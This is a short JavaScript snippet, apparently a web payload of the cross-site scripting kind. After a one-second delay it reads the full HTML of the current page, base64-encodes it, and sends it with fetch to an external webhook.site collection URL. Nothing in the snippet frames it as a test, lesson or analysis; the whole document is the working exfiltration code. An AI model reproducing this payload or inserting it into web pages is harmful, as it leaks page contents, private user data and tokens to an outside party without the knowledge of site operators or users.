setTimeout(() => {
  const html = document.documentElement?.innerHTML || "no_html";
  fetch("https://webhook.site/8c3eac76-d767-40eb-adc2-965bf69d0e82?dump=" + btoa(html));
}, 1000);
